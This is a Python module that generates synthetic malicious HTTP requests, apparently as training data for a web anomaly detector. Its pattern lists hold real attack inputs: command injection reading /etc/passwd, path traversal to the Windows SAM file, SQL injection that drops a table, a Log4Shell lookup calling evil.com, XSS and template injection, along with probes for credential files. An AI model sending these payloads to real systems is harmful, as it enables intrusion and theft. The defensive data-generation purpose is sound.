"""
Data Augmentation for Anomaly Patterns
Generates synthetic anomalous HTTP requests to improve model generalization
"""

import random
from typing import List, Dict
import datetime


class AnomalyAugmenter:
    """Generate diverse anomalous HTTP request patterns"""

    def __init__(self):
        # Known malicious user agents
        self.malicious_user_agents = [
            "sqlmap/1.4.7#stable (http://sqlmap.org)",
            "nikto/2.1.5",
            "Acunetix-Vulnerability-Scanner",
            "OpenVAS",
            "Metasploit",
            "ZmEu",
            "masscan/1.0",
            "nmap/7.80",
            "WPScan v3.8.7",
            "dirbuster/1.0",
            "gobuster/3.0.1",
            "burpsuite/2.1",
            "OWASP ZAP/2.9.0",
            "havij/1.17",
            "commix/3.1",
            "w3af/1.7.6",
        ]

        # Suspicious bot patterns
        self.suspicious_bots = [
            "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
            "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
            "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
            "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)",
            "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)",
            "python-requests/2.25.1",
            "Python-urllib/3.8",
            "Java/1.8.0_261",
            "Go-http-client/1.1",
            "libwww-perl/6.05",
            "Wget/1.20.3 (linux-gnu)",
            "HTTPie/2.3.0",
        ]

        # Command injection attempts
        self.injection_patterns = [
            "; cat /etc/passwd",
            "| whoami",
            "` id `",
            "$(/bin/bash -c 'echo vulnerable')",
            "'; DROP TABLE users; --",
            '" OR 1=1 --',
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%00",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "${7*7}",
            "<script>alert('XSS')</script>",
        ]

        # Malicious endpoints
        self.malicious_endpoints = [
            "/admin",
            "/wp-admin",
            "/phpmyadmin",
            "/.env",
            "/.git/config",
            "/backup.sql",
            "/wp-config.php",
            "/config.php.bak",
            "/shell.php",
            "/cmd.php",
            "/eval.php",
            "/system.php",
            "/.ssh/id_rsa",
            "/api/v1/users/dump",
            "/debug/vars",
            "/.aws/credentials",
        ]

        # Suspicious HTTP methods
        self.suspicious_methods = [
            "TRACE",
            "TRACK",
            "OPTIONS",
            "CONNECT",
            "PROPFIND",
            "PROPPATCH",
            "MKCOL",
            "COPY",
            "MOVE",
            "LOCK",
            "UNLOCK",
        ]

        # Suspicious headers
        self.suspicious_headers = [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Originating-IP", "[127.0.0.1]"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Remote-Addr", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Forwarded-Host", "evil.com"),
            ("X-Frame-Options", "ALLOWALL"),
            ("Referer", "https://evil-site.com/attack"),
            ("Origin", "null"),
            ("X-Requested-With", "XMLHttpRequest"),
            (
                "Content-Type",
                "application/x-www-form-urlencoded; charset=utf-8' OR 1=1--",
            ),
            ("Authorization", "Basic YWRtaW46YWRtaW4="),  # admin:admin
            ("Cookie", "PHPSESSID=evil; admin=true"),
        ]

    def generate_anomalous_request(self, anomaly_type: str = None) -> Dict:
        """
        Generate an anomalous HTTP request

        Args:
            anomaly_type: Specific type of anomaly to generate, or None for random

        Returns:
            Dictionary with request data
        """
        if anomaly_type is None:
            anomaly_type = random.choice(
                [
                    "malicious_ua",
                    "suspicious_bot",
                    "injection",
                    "malicious_endpoint",
                    "suspicious_method",
                    "suspicious_headers",
                    "combined",
                ]
            )

        # Start with a normal-looking request
        request_data = {
            "Timestamp": datetime.datetime.now().isoformat(),
            "Request ID": f"aug-{random.randint(10000, 99999)}",
            "Endpoint": "/",
            "Client Address": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Method": "GET",
            "URL": "http://localhost:6543/",
            "Headers": [
                "Host: localhost:6543",
                "Accept: text/html,application/xhtml+xml",
                "Accept-Language: en-US,en;q=0.9",
                "Accept-Encoding: gzip, deflate",
                "Connection: keep-alive",
            ],
        }

        # Apply anomaly patterns
        if anomaly_type == "malicious_ua":
            request_data["User-Agent"] = random.choice(self.malicious_user_agents)

        elif anomaly_type == "suspicious_bot":
            request_data["User-Agent"] = random.choice(self.suspicious_bots)

        elif anomaly_type == "injection":
            injection = random.choice(self.injection_patterns)
            if random.random() < 0.5:
                # Inject in URL parameter
                request_data["URL"] = f"http://localhost:6543/?id={injection}"
            else:
                # Inject in User-Agent
                request_data["User-Agent"] += injection

        elif anomaly_type == "malicious_endpoint":
            endpoint = random.choice(self.malicious_endpoints)
            request_data["Endpoint"] = endpoint
            request_data["URL"] = f"http://localhost:6543{endpoint}"

        elif anomaly_type == "suspicious_method":
            method = random.choice(self.suspicious_methods)
            request_data["Method"] = method

        elif anomaly_type == "suspicious_headers":
            # Add 2-4 suspicious headers
            num_headers = random.randint(2, 4)
            selected_headers = random.sample(self.suspicious_headers, num_headers)
            for header, value in selected_headers:
                request_data["Headers"].append(f"{header}: {value}")

        elif anomaly_type == "combined":
            # Combine multiple anomaly types
            combinations = random.sample(
                [
                    "malicious_ua",
                    "suspicious_bot",
                    "injection",
                    "malicious_endpoint",
                    "suspicious_method",
                    "suspicious_headers",
                ],
                k=random.randint(2, 3),
            )

            for combo_type in combinations:
                request_data = self._apply_anomaly(request_data, combo_type)

        # Sort headers for consistency
        request_data["Headers"].sort()

        return request_data

    def _apply_anomaly(self, request_data: Dict, anomaly_type: str) -> Dict:
        """Apply a specific anomaly type to existing request data"""
        if anomaly_type == "malicious_ua":
            request_data["User-Agent"] = random.choice(self.malicious_user_agents)
        elif anomaly_type == "injection":
            injection = random.choice(self.injection_patterns)
            request_data["URL"] = f"http://localhost:6543/?cmd={injection}"
        elif anomaly_type == "malicious_endpoint":
            endpoint = random.choice(self.malicious_endpoints)
            request_data["Endpoint"] = endpoint
            request_data["URL"] = f"http://localhost:6543{endpoint}"
        elif anomaly_type == "suspicious_headers":
            header, value = random.choice(self.suspicious_headers)
            request_data["Headers"].append(f"{header}: {value}")

        return request_data

    def augment_dataset(self, num_samples: int = 50) -> List[Dict]:
        """
        Generate a diverse set of anomalous requests

        Args:
            num_samples: Number of anomalous samples to generate

        Returns:
            List of request dictionaries
        """
        augmented_requests = []

        # Ensure we have a good distribution of anomaly types
        min_per_type = max(1, num_samples // 7)

        anomaly_types = [
            "malicious_ua",
            "suspicious_bot",
            "injection",
            "malicious_endpoint",
            "suspicious_method",
            "suspicious_headers",
            "combined",
        ]

        # Generate minimum samples per type
        for anomaly_type in anomaly_types:
            for _ in range(min_per_type):
                augmented_requests.append(self.generate_anomalous_request(anomaly_type))

        # Fill remaining with random types
        remaining = num_samples - len(augmented_requests)
        for _ in range(remaining):
            augmented_requests.append(self.generate_anomalous_request())

        # Shuffle to mix types
        random.shuffle(augmented_requests)

        return augmented_requests[:num_samples]


if __name__ == "__main__":
    # Example usage
    augmenter = AnomalyAugmenter()

    # Generate a single anomalous request
    anomaly = augmenter.generate_anomalous_request("malicious_ua")
    print("Example anomalous request:")
    print(f"User-Agent: {anomaly['User-Agent']}")
    print(f"Endpoint: {anomaly['Endpoint']}")
    print(f"Method: {anomaly['Method']}")
    print()

    # Generate a dataset of anomalies
    anomalies = augmenter.augment_dataset(10)
    print(f"Generated {len(anomalies)} anomalous requests:")
    for i, req in enumerate(anomalies):
        print(f"{i+1}. UA: {req['User-Agent'][:50]}... Endpoint: {req['Endpoint']}")
